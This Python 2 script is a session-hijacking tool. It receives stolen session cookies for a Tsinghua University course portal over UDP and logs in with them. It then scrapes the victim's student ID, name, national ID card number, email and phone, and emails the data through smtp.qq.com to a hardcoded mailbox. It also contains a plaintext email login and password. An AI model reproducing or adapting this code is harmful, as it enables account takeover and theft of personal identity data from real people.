# -*- coding: UTF-8 -*-
 
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE,formatdate
from email import encoders
from bs4 import BeautifulSoup
import smtplib,os,socket,urllib2, urllib, sys,re,cookielib


server={'name':'smtp.qq.com',
        'user':'u_235@qq.com',
        'passwd':'th2010012028'}
#data='<ip>59.66.133.2</ip><time>00:19</time>'
def check(ip):
  url="".join(['http://www.123cha.com/ip/?q=',ip])
  r = urllib2.urlopen(url)
  html= str(r.read())
  print html
  soup= BeautifulSoup(html)
  result=soup.find(attrs={"id":"csstb"}).findAll("li")
  address=result[7].contents[0]
  return address


def send_mail(server, to, subject, text, files=[]): 
    assert type(server) == dict 
    assert type(to) == list 
    assert type(files) == list 
    fro=server['user']
    msg = MIMEMultipart() 
    msg['From'] = fro 
    msg['Subject'] = subject 
    msg['To'] = COMMASPACE.join(to) #COMMASPACE==', ' 
    msg['Date'] = formatdate(localtime=True) 
    msg.attach(MIMEText(text)) 
 
    for file in files: 
        part = MIMEBase('application', 'octet-stream') #'octet-stream': binary data 
        part.set_payload(open(file, 'rb').read())
        encoders.encode_base64(part) 
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file)) 
        msg.attach(part) 
 
    smtp = smtplib.SMTP(server['name']) 
    smtp.login(server['user'], server['passwd']) 
    smtp.sendmail(fro, to, msg.as_string()) 
    smtp.close()

def get_info(t,j):
  pre='learn.tsinghua.edu.cn	FALSE	/	FALSE		'
  f=open('cookies.txt','wb')
  f.write('# Netscape HTTP Cookie File')
  f.write(''.join([pre,'JSESSIONID','\t',j,'\n']))
  f.write(''.join([pre,'THNSV2COOKIE','\t',t,'\n']))
  f.close()               
  cjar = cookielib.MozillaCookieJar()
  cjar.load('cookies.txt',ignore_discard=True, ignore_expires=True)
  opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cjar))
  opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
  urllib2.install_opener(opener)
  domain='http://learn.tsinghua.edu.cn'
  login_page = "".join([domain,'/MultiLanguage/lesson/teacher/loginteacher.jsp'])
  cjar.save('cookies.txt',ignore_discard=True, ignore_expires=True)
  print cjar
  try:
    page=opener.open("".join([domain,'/MultiLanguage/vspace/vspace_userinfo1.jsp']))
    soup = BeautifulSoup(page.read())
    stu_id=soup.find(attrs={'name':'id'}).contents[0]
    name=soup.find(attrs={'name':'name'}).contents[0]
    id_card=soup.find(attrs={'name':'id_card'}).contents[0]
    gender=soup.find(attrs={'name':'gender'}).contents[0]
    user_type=soup.find(attrs={'name':'user_type'}).contents[0]
    email=soup.find(attrs={'name':'email'})['value']
    phone=soup.find(attrs={'name':'phone'})['value']
    info="".join([stu_id,"\r\n",
                  name,"\r\n",
                  id_card,"\r\n",
                  gender,"\r\n",
                  user_type,"\r\n",
                  email,"\r\n",
                  phone])
    return info
  except Exception,e:
    print str(e)



if __name__ == '__main__':
    sock_notice = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_notice.bind(('127.0.0.1',9876))
    #print check('59.66.123.12')
while False:
    data, addr = sock_notice.recvfrom(2048)
    message=BeautifulSoup(data)
    print message
    ip=message.ip.contents[0]
    time=message.time.contents[0]
    j=message.j.contents[0]
    t=message.t.contents[0]
    #address=check(ip)#.encode('utf-8')
    info=get_info(t,j)
    data=''.join(["ip: ",ip,"\r\n",
                   #"address: ",check(ip),"\r\n",
                   "time: ",time,"\r\n",info])
    print data
    send_mail(server,['u_235@qq.com'],'Cloud-report',data.encode('utf-8'))
    break

